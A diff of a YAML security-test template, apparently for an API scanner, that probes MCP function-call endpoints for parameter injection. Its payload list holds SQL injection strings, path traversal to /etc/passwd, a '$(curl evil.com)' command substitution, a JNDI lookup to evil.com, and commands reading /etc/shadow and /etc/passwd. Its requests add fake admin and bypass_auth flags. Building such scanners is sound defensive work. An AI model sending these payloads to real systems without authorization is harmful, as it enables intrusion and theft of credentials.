@@ -22,22 +22,22 @@ info:
   subCategory: MCP_FUNCTION_CALL_PARAMETER_INJECTION
   severity: HIGH
   tags:
-  - Parameter Injection
-  - Function Manipulation
-  - Input Validation
-  - MCP
-  - AI/LLM Security
+    - Parameter Injection
+    - Function Manipulation
+    - Input Validation
+    - MCP
+    - AI/LLM Security
   references:
-  - https://www.promptfoo.dev/docs/red-team/plugins/mcp/
-  - https://owasp.org/www-project-api-security/
-  - https://cwe.mitre.org/data/definitions/89.html
+    - https://www.promptfoo.dev/docs/red-team/plugins/mcp/
+    - https://owasp.org/www-project-api-security/
+    - https://cwe.mitre.org/data/definitions/89.html
   cwe:
-  - CWE-89
-  - CWE-78
-  - CWE-20
-  - CWE-74
+    - CWE-89
+    - CWE-78
+    - CWE-20
+    - CWE-74
   cve:
-  - CVE-2023-38254
+    - CVE-2023-38254
 attributes:
   nature: INTRUSIVE
   plan: PRO
@@ -50,62 +50,61 @@ api_selection_filters:
     lt: 300
   request_payload:
     contains_all:
-    - jsonrpc
-    - method
-    - params
+      - jsonrpc
+      - method
+      - params
     for_one:
       key:
-        contains_either: "$magic From the request body, locate the `params` object. Inside `params`, find the `arguments` object if it exists. Select any parameter key that accepts user input. Return the key name. If not found, return []."
-        extract: paramKey
-      value:
-        extract: paramValue
+        regex: .*
+        extractMultiple: payloadKeys
+
 wordLists:
+
   injectionPayloads:
-  - "'; DROP TABLE users; --"
-  - "1' OR '1'='1"
-  - "../../../etc/passwd"
-  - "$(curl evil.com)"
-  - "`whoami`"
-  - "; cat /etc/shadow #"
-  - "admin' --"
-  - "{{7*7}}"
-  - "${jndi:ldap://evil.com/a}"
-  - "<!--#exec cmd=\"ls\" -->"
+    - "'; DROP TABLE users; --"
+    - "1' OR '1'='1"
+    - "../../../etc/passwd"
+    - "$(curl evil.com)"
+    - "`whoami`"
+    - "; cat /etc/shadow #"
+    - "admin' --"
+    - "{{7*7}}"
+    - "${jndi:ldap://evil.com/a}"
+    - "<!--#exec cmd=\"ls\" -->"
+
 execute:
   type: multiple
   requests:
-  # Test 1: SQL injection in parameter
-  - req:
-    - modify_body_param:
-        params.arguments.${paramKey}: "${injectionPayloads}"
-  # Test 2: Add malicious extra parameters
-  - req:
-    - add_body_param:
-        params.arguments.admin: "true"
-    - add_body_param:
-        params.arguments.bypass_auth: "1"
-    - add_body_param:
-        params.arguments.privileged: "true"
-  # Test 3: Inject command execution parameters
-  - req:
-    - modify_body_param:
-        params.arguments.command: "whoami; cat /etc/passwd"
-    - add_body_param:
-        params.arguments.shell: "/bin/bash"
+    # Test 1: SQL injection in parameter
+    - req:
+        - add_body_param:
+            params.arguments.${payloadKeys}: "${injectionPayloads}"
+        # Test 2: Add malicious extra parameters
+        - add_body_param:
+            params.arguments.admin: "true"
+        - add_body_param:
+            params.arguments.bypass_auth: "1"
+        - add_body_param:
+            params.arguments.privileged: "true"
+        # Test 3: Inject command execution parameters
+        - modify_body_param:
+            params.arguments.command: "whoami; cat /etc/passwd"
+        - add_body_param:
+            params.arguments.shell: "/bin/bash"
 validate:
   response_code:
     gte: 200
     lt: 300
   response_payload:
     not_contains:
-    - Error
-    - error
-    - Invalid parameter
-    - injection detected
-    - malicious input
-    - validation failed
-    - unauthorized
-    - forbidden
+      - Error
+      - error
+      - Invalid parameter
+      - injection detected
+      - malicious input
+      - validation failed
+      - unauthorized
+      - forbidden
 strategy:
   run_once: /
 
